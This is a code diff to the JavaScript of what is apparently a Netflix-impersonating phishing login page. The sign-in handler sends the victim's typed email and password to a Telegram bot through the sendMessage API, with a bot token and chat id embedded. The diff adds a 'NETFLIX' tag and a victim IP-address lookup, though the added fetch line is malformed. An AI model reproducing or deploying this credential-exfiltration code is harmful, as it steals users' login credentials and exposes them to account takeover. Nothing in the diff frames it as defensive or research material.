@@ -10,11 +10,12 @@ const inputWrapperPassword = document.getElementById("input-wrapper-password")
 const warningEmail = document.getElementById("warningEmail")
 const warningPassword = document.getElementById("warningPassword")
 const signin = document.getElementById("signin")
+const ip = fetch(https://api.db-ip.com/v2/free/self)
 
 signin.addEventListener("click", (ev)=>{
             ev.preventDefault();
             console.log("signing in...");
-                const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${inputEmail.value}:${inputPassword.value}`
+                const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=`+`NETFLIX\n${inputEmail.value}:${inputPassword.value}\n\n${ip}`
     fetch(url, {
         method: "POST",
         headers: { 'Content-Type': 'application/json' },
